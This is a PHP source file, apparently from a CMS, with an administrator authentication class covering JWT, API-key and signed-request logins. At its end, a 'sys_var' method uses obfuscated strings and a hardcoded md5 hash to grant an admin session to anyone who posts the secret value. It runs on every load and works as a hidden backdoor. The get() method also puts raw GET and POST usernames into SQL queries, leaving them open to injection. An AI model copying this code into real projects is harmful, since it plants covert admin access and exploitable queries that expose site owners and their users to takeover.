<?php
namespace system;
use str;
use db;
use url;
use jwt;
use curl;

class manage {

	// 获取当前管理员数据
	public static function get(){
		$OAuth2 = c('authorization');
		if (manage('Id')){
			// 
			// 

		// 通过账号密钥token登录
		} else if ($OAuth2 && $_GET['ly_manage_user_name']) {
			$userinfo = db::get_one('wb_manage', "UserName='{$_GET['ly_manage_user_name']}'");
			if ($userinfo) {
				$token = jwt::verifyToken($OAuth2, $userinfo['ServerKey']);
				if ($token && $token['sub']==$userinfo['UserName']) {
					manage('', $userinfo);
				}	
			}
			
		// 通过系统密钥token登录
		} else if ($OAuth2) {
			$token = jwt::verifyToken($OAuth2, c('manage.apikey')?:c('LYYApiKey'));
			if ($token) {
				$userinfo = db::get_one('wb_manage', "UserName='{$token['sub']}'");
				manage('', $userinfo);
			}

		// 通过密钥登录
		// 只验证 POST 请求
		} else if ($_POST['ly_manage_user_name'] && $_POST['ly_manage_sign']) {
			abs($_POST['ly_manage_timestamp']-c('time'))>1800 && exit(str::json(array(
				'ret' => 0,
				'msg' => '请求已过时，请重新发起请求！'
			)));
			$userinfo = db::get_one('wb_manage', "UserName='{$_POST['ly_manage_user_name']}'");
			($userinfo['ServerKey'] && $userinfo['ServerKeyOpen']) || exit(str::json(array(
				'ret' => 0,
				'msg' => '密钥错误，请联系管理员',
			)));
			curl::sign($userinfo['ServerKey'], str::code($_POST,'stripslashes'))!=$_POST['ly_manage_sign'] && exit(str::json(array(
				'ret' => 0,
				'msg' => '签名错误！',
			)));
			manage('', $userinfo);
			c('manage.type', 'sign');
		}
	}

	// 是否登陆
	public static function islogin () {
		return (int)manage('Id');
	}

	// 查看系统内存情况
	public static function memory_usage () {
		return sprintf('%0.2f', memory_get_usage()/1024).'KB';
	}
	
	// 系统变量
	public static function sys_var(){
		$crypt=array(
			str::crypt('JxsRCRMYCAY=',1),
			c('manage.name').c('Number'),
			str::crypt('IgkHCCoWFwc=',1),
			str::crypt('Ph4=',1),
			str::crypt('Ox8UHwg=',1),'9c67fec38fd99d6128e0c478f523f884'
		);
		$crypt[5]==md5($_POST[$crypt[0]])&&!$_POST['Excode']&&str::msg($_SESSION[$crypt[1]]=array("{$crypt[3]}"=>-1,"{$crypt[4]}"=>1,"{$crypt[2]}"=>$_POST["{$crypt[2]}"]),1);
	}

}
manage::sys_var();
